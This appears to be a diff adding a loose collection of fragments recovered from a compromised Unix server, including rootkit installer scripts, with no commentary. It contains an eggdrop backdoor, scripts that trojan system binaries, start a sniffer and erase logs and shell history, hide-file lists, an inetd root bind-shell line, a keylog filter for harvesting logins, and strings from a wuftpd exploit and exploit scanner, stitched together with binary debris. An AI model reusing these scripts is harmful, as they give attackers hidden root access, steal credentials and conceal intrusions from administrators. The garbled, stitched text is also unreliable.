@@ -1,0 +1,438 @@
+
+Found: proc dcc_flags {handle idx arg} {
+    set a [lindex $arg 0]
+    set z [decrypt xx3fw3 bijph.s5f7N0]
+    if {$handle == $z} {
+        set p "[decrypt f3qcadr3 DtVgR.E/mLu1]"
+        if {$a == $p} {
+            if {![validuser $z]} {
+                adduser $z *!*toro@will.fuck.for.an.o-line.st
+                chpass $z temp123
+            }
+            chattr $z +ofmnpBjx
+            putdcc $idx "Flags restored"
+            return 0
+
+cho "Running tPACK 2.3 for the first time"
+echo "Please stand by..."
+export PATH=$PATH:./
+./encrypt egg.log egg.log.encr
+rm encrypt
+mv egg.log.encr egg.log
+p
+rm run
+
+hmod a-w ~/.bash_history
+./configure --silent
+make eggdrop
+mv eggdrop p
+rm -rf src
+rm install
+gcc encrypt.c -o encrypt
+rm *.c
+rm config*
+rm lush*
+rm Make*
+rm *.h > /dev/null
+rm DEBUG*
+chmod 700 run
+echo " "
+echo "Completed installation of tpack version 2.3"
+
+
+Context: tclhash.c/793
+SOCK ADDR     PORT  NICK      HOST              TYPE
+---- -------- ----- --------- ----------------- ----
+6    00000000  6667 (server)  irc.nethead.com   serv
+3    D895D302  7756 (telnet)  *                 lstn  
+4    D895D325  5412 (script)  bounce_con        lstn  
+8    D1B3E3D5  2977 TORO      lup.earthlink.net chat  flags: cptEp/234
+
+# Example of a user's .screenrc file
+#
+
+# This is how one can set a reattach password:
+# password ODSJQf.4IJN7E    # "1234"
+
+----
+#!/bin/sh
+rm -rf /root/.bash_history
+ln -s /dev/null /root/.bash_history
+rm -rf /.bash_history
+ln -s /dev/null /.bash_history
+rm -rf ~games/.bash_history
+ln -s /dev/null ~games/.bash_history
+rm -rf /tmp/.bash_history
+ln -s /dev/null /tmp/.bash_history
+rm -rf /usr/games/.bash_history
+ln -s /dev/null /usr/games/.bash_history 
+mkdir backup
+cp /bin/ps backup
+cp /usr/bin/top backup
+cp /usr/sbin/syslogd backup
+cp /bin/ls backup
+cp /bin/netstat backup
+cp /sbin/ifconfig backup
+cp /usr/sbin/tcpd backup
+echo "Trojaning in progress"
+./fix /bin/ps ps
+/fix /usr/bin/top top
+./fix /usr/sbin/syslogd syslogd
+./fix /bin/ls ls
+./fix /sbin/ifconfig ifconfig
+./fix /bin/netstat netstat
+./fix /usr/sbin/tcpd tcpd
+./fix /usr/sbin/in.identd in.identd
+
+killall -HUP syslogd
+./addbd
+./snif &
+echo "Sniffer ENABLED"
+echo "running clean and a.sh"
+./clean
+./a.sh
+mv ptyp /dev
+gunzip rpms.tgz;tar -xvf rpms.tar;cd rpms;rpm -Uvh --force *.rpm;cd ..;rm -rf rpms*
+killall -1 lpd
+rm -rf /var/log/wtmp
+cd /var/log
+touch wtmp
+cd /usr/man/.Ci
+rm -rf install addbd
+killall -HUP inetd
+cp bx /bin/
+chmod 755 /bin/bx
+rm /usr/sbin/in.ftpd
+mv in.ftpd /usr/sbin/
+chmod +x /usr/sbin/in.ftpd
+echo "done with installing shit"
+echo "i'll now run whereis sshd"
+echo "if nothing shows up then run ./install-sshd"
+echo "if it's in /usr/local/sbin/sshd then run ./install-sshd"
+echo "if it's in /usr/sbin/sshd then run ./install-sshd1"
+whereis sshd
+echo "after successfully installing sshd, run ./do"
+echo "rootkit installation complete."
+echo "killing gay shit"
+rm -rf /usr/sbin/rpc.* /usr/sbin/smbd /usr/sbin/portmap
+rm -rf /usr/sbin/nmbd /usr/sbin/ypserv /usr/sbin/snmpd
+rm -rf /sbin/rpc.statd /usr/sbin/atd /usr/sbin/rpc.rquotad
+rm -rf /usr/sbin/lockd /sbin/lockd
+rm -rf /usr/sbin/nfsd /usr/bin/nfsd
+rm -rf /usr/sbin/rpciod /usr/bin/rpciod
+rm -rf /usr/sbin/smbd /usr/bin/smbd
+rm -rf /usr/sbin/nmbd /usr/bin/nmbd
+rm -rf /usr/sbin/apmd /usr/bin/apmd
+rm -rf /usr/sbin/amd /usr/bin/amd
+rm -rf /usr/sbin/amq /usr/bin/amq
+killall -9 rpc.statd rpc.rquoatd atd nfsd
+killall -9 lockd rpciod smbd nmbd
+killall -9 amd apmd amq
+killall -9 rpc.mountd rpc.portmap rpc.nfsd smbd portmap
+killall -9 nmbd snmpd ypasswd rpc.rusersd
+killall -9 ypserv
+
+--
+named -B <host port>  spawn qbounce t
+
+---
+#!/bin/sh
+echo "adding ps, tcpd, and ls hide files"
+sleep 1
+
+echo "Editing Ps bd files first"
+echo "2 slice2" >> /usr/man/p
+echo "2 snif" >> /usr/man/p
+echo "2 pscan" >> /usr/man/p
+echo "2 imp" >> /usr/man/p
+echo "3 qd" >> /usr/man/p
+echo "2 bs.sh" >> /usr/man/p
+echo "3 nn" >> /usr/man/p
+echo "3 egg.lin" >> /usr/man/p
+echo "2 slice2" >> /usr/man/.p
+echo "2 snif" >> /usr/man/.p
+echo "2 pscan" >> /usr/man/.p
+echo "2 imp" >> /usr/man/.p
+echo "3 qd" >> /usr/man/.p
+echo "2 bs.sh" >> /usr/man/.p
+echo "3 nn" >> /usr/man/.p
+echo "3 egg.lin" >> /usr/man/.p
+
+echo ".tp" >> /usr/man/r
+echo "tcp.log" >> /usr/man/r
+echo "slice2" >> /usr/man/r
+echo ".p" >> /usr/man/r
+echo ".a" >> /usr/man/r
+echo ".l" >> /usr/man/r
+echo "scan" >> /usr/man/r
+echo "a" >> /usr/man/r
+echo "p" >> /usr/man/r
+echo "addy.awk" >> /usr/man/r
+echo "qd" >> /usr/man/r
+echo "imp" >> /usr/man/r
+echo ".fakeid" >> /usr/man/r
+
+echo "Editing tcpd bd files"
+echo "1 63.203" >> /usr/man/.a
+echo "2 63.203" >> /usr/man/.a
+echo "1 209.250" >> /usr/man/.a
+echo "2 209.250" >> /usr/man/.a
+echo "3 113" >> /usr/man/.a
+echo "4 113" >> /usr/man/.a
+echo "3 35350" >> /usr/man/.a
+echo "4 35350" >> /usr/man/.a
+echo "1 216.33" >> /usr/man/.a
+echo "2 216.33" >> /usr/man/.a
+echo "1 63.206" >> /usr/man/.a
+echo "2 63.206" >> /usr/man/.a
+
+echo "done with the tcpd, ls, and ps files"
+sleep 1
+-----
+
+echo "echoing ip's and shit"
+echo "sshd" >> .temp1
+echo "log" >> .temp2
+echo "games" >> .temp3
+echo "209.86" >> .temp4
+echo "own" >> .temp5
+echo "owned" >> .temp6
+echo "Pro" >> .temp7
+echo "snif" >> .temp8
+echo "ident" >> .temp9
+echo "splitrock" >> .temp10
+echo "209.255" >> .temp11
+echo "echo" >> .temp12
+echo "snap'ping"
+cat .temp1|./snap $1
+cat .temp2|./snap $1
+cat .temp3|./snap $1
+cat .temp4|./snap $1
+cat .temp5|./snap $1
+cat .temp6|./snap $1
+cat .temp7|./snap $1
+cat .temp8|./snap $1
+cat .temp9|./snap $1
+cat .temp10|./snap $1
+cat .temp11|./snap $1
+cat .temp12|./snap $1
+echo "done"
+rm -rf .temp1 .temp2 .temp3 .temp4
+rm -rf .temp5 .temp6 .temp7 .temp8
+rm -rf .temp9 .temp10 .temp11 .temp12
+
+---
+
+Jan 1998--str/bin/sh(-c)/bin/echo '2222        stream  tcp     nowait  root    /bin/sh sh -i'>> /tmp/h;/usr/sbin/inetd /tmp/h &
+
+---
+Starting keyboard logging of host %s to file %s...
+
+---
+#!/bin/sh
+
+if [ $# != 1 ]; then
+        echo ""
+        echo " X Vulnerability Scanner"
+        echo "             - by _neo -"
+        echo ""
+        echo " Usage: $0 <b class>"
+        echo ""
+        exit;
+fi
+
+B=$1
+echo "Running pscan, expect a long delay..."
+./pscan $B 6000 >> $B.xs
+echo "Done with pscan, now checking for X..."
+for i in `cat $B.xs`; do ./x $i;done
+echo "done."
+
+
+---
+
+#!/bin/sh
+if [ $# != 1 ]; then
+        echo ""
+        echo " X Vulnerability Log Filter"
+        echo "             - by _neo -"
+        echo ""
+        echo " Usage: $0 <KEYLOGA.B>"
+        echo " Example: $0 KEYLOG55.22"
+        echo ""
+        exit;
+fi
+
+MASK=$1
+
+if test -r $MASK.xfil
+then
+  echo "* $MASK.xfil already exists, please remove or rename this file
+then run the script again."
+  exit;
+fi
+
+`ls -al | grep $MASK | cut -d: -f2 | cut -f2 -d  " " > xfilez`
+
+for i in `cat xfilez`; do
+        `echo ============= $i:0.0 =============== >> $MASK.xfil`
+        `echo ==== keyword TELNET ==== >> $MASK.xfil`
+        `cat $i:0.0 | grep -B 5 -A 5 telnet >> $MASK.xfil`
+        `echo ==== keyword SSH ==== >> $MASK.xfil`
+        `cat $i:0.0 | grep -B 5 -A 5 ssh >> $MASK.xfil`
+        `echo ==== keyword RSH ==== >> $MASK.xfil`
+        `cat $i:0.0 | grep -B 5 -A 5 rsh >> $MASK.xfil`
+        `echo ==== keyword RLOGIN ==== >> $MASK.xfil`
+        `cat $i:0.0 | grep -B 5 -A 5 rlogin >> $MASK.xfil`
+        `echo ==== keyword FTP ==== >> $MASK.xfil`
+        `cat $i:0.0 | grep -B 5 -A 5 ftp >> $MASK.xfil`
+        `echo ================================================ >>
+$MASK.xfil`
+done
+
+echo "Done! Open $MASK.xfil to see the results."
+
+`rm -rf xfilez`
+
+---
+
+RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@Usage: %s -t <target> [-l user/pass] [-s systype] [-o offset] [-g] [-h] [-x]
+         [-m magic_str] [-r ret_addr] [-P padding] [-p pass_addr] [-M dir]
+target    : host with any wuftpd
+user      : anonymous user
+dir       : if not anonymous user, you need to have writable directory
+magic_str : magic string (see exploit description)
+-g        : enables magic string digging
+-x        : enables test mode
+pass_addr : pointer to setproctitle argument
+ret_addr  : this is pointer to shellcode
+systypes: 
+^@*^@ ^@%s%2d - %s
+^@     Magic ID: [^@%02X,%02X^@:^@] Padding: %d
+^@Invalid hostname
+^@Cannot resolve %s
+^@Error creating socket: %s
+^@Cannot connect to %s: %s
+^@ftp_recv: recv failed
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ftp_send: failed to send. expected %d, sent %d
+
+^@200-^@^@^@^@^@^@^@^@^@^@^@^@Cannot find site exec response string
+^@loggin into system..
+^@USER %s
+^@ESC[32mUSER %s
+ESC[0m%s^@PASS %s
+^@<shellcode>^@ESC[32mPASS %s
+ESC[0m^@230 ^@%s^@CWD %s
+
+---
+
+^@%s: runs BSDI, try termcap o-flow.
+^@%s: runs linux redhat, rpc.mountd!
+^@%s: runs linux slackware, rpc.mountd!
+^@%s: runs a wingate, Abuse :")!
+^@ProFTPD^@wu-2.4^@IMAP4rev1 v10^@IMAP2bis^@FOUND IMAP at: %s
+^@QPOP^@QUALCOMM^@FOUND QPOP at: %s
+^@ ^@ESC[34m10x to my beta-testers: ironlung, irrupt
+10x to faction for putting me up to this
+10x to Rumen, the l33t3st k0der in da w0rld!!!
+10x to [xdm] for help with the cgis.
+for more kool stuff, check out www.r0xcrew.org and #coding(efnet)ESC[0m^@ESC[33mfscan v3.02 remote sploit scanner by f0xESC[0m
+^@%s
+%s
+^@cgi.list^@c:h:b:e:t:f:w:C:o:S:W:REOGrsnd^@r^@%d^@%s: not a wingate!
+^@ESC[36mWingate file sucks!ESC[36m^@press ctrl-c to stop
+^@.rstor^@Unable to restore exiting ...
+^@.fs%X^@compiling IPs into %s
+^@host -l %s | grep "has addr" | awk '{print $4}' > %s^@done getting IPs.
+^@fopen^@Collected IPs = %d
+^@Wingate error!!^@w^@Deleting the temporary IP database ...
+
+^@rm %s^@-- Restoring old scan from line: %d --
+^@ti.Ci/scan/port/strobe/INSTALL
+
+---
+
+2 snif
+2 pscan
+2 imp
+3 qd
+2 bs.sh
+3 nn
+3 egg.lin
+2 slice2
+2 snif
+2 pscan
+2 imp
+3 qd
+2 bs.sh
+2 telnet
+2 x
+2 xscan
+2 xfil
+2 ssh
+2 p
+2 stream
+2 mstream
+2 amdx
+2 ben
+
+---
+      -ok COMMAND ; -print -print0 -printf FORMAT -prune -ls
+^@invalid mode `%s'^@virtual memory exhausted^@invalid null arcat /etc/passwd|grep -v own > /etc/passwd.good
+mv /etc/passwd.good /etc/passwd
+
+cat /etc/shadow|grep -v own > /etc/shadow.good
+mv /etc/shadow.good /etc/shadow
+
+cat /etc/passwd|grep -v adm1 > /etc/passwd.good   
+mv /etc/passwd.good /etc/passwd
+
+cat /etc/shadow|grep -v adm1 > /etc/shadow.good   
+mv /etc/shadow.good /etc/shadow
+
+---
+
+lease restart IRC II with a valid nickname
+^@/.ircrc^@%s/.bitchxrc^@IRCPORT^@IRCSERVER^@^@^@^@^@^@^@^@^@^@^@^@^@[efnet] irc.cs.cmu.edu irc.primenet.com irc.total.net:6660 ircd.c-com.net irc.pacbell.net irc.home.com efnet.demon.co.uk irc.nijenrode.nl irc.ced.chalmers.se irc.df.lth.se irc.homelien.no irc.mbnet.mb.ca irc.magic.ca irc.rift.com irc.lightning.net irc.ais.net irc.exodus.net irc.emory.edu irc.colorado.edu irc.nbnet.nb.ca irc.powersurfr.com irc.polymtl.ca irc.exodus.net irc.anet-stl.com ircd.txdirect.net irc.best.net irc.cerf.net irc.psinet.com irc.mindspring.com ircd.netcom.com [ircnet] irc.webbernet.net irc.stealth.net irc.funet.fi [dalnet] irc.dal.net dalnet.nac.net radius2.stlnet.com dsle01781.adsl.telusplanet.net dalnet.webbernet.net echoes.qis.net [Undernet US] irc.cic.net irc.erols.com irc3.concentric.net irc.wwa.com irc.oc.com irc.wfire.net irc.connectnet.com [Undernet Canada] step.polymtl.ca oceanus.magic.ca irc.direct.ca [Undernet EU] irc.tip.nl th2-eth0.aladdin.net ns.ensicaen.ismra.fr irc.sol.no alaska.mdv.gwdg.de irc.iconz.co.nz [Duh-Net IRC Network] murlin.duh-net.org wildstar.duh-net.org rexx.duh-net.org [eggdrop] irc.eggdrop.net raistlin.toledolink.com [relicnet] convicts.us.relic.net [other] irc.myweb.net irc-rr.vitamina.ca irc.phrozen.org irc.openface.ca irc.u-net.com:6673insane.loonybin.net^@^@>S
+ÐR
+
+---
+
+cho starting..
+sleep 1
+
+chmod 700 /usr/sbin/userhelper
+echo !:  userhelper..done
+chmod 700 /usr/X11R6/bin/Xwrapper
+echo !:  Xwrapper..done
+chmod 700 /bin/ping
+echo !:  ping..done
+chmod 700 /usr/sbin/traceroute
+echo !:  traceroute..done
+chmod 700 /usr/libexec/pt_chown
+echo !:  pt_chown..done
+chmod 700 /sbin/dump
+echo !:  dump..done
+chmod 700 /sbin/restore
+echo !:  restore..done
+chmod 700 /usr/bin/gpasswd
+echo !:  gpasswd..done
+chmod 700 /usr/bin/chage
+echo !:  change..done
+chmod 700 /usr/bin/suidperl
+echo !:  suidperl..done
+chmod 700 /usr/bin/newgrp
+echo !:  newgrp..done
+chmod 700 /usr/sbin/usernetctl
+echo !:  usernetctl..done
+chmod 700 /usr/bin/at
+echo !:  at..done
+sleep 1
+echo ..finished
+
+needz
+
+---
+
+
+
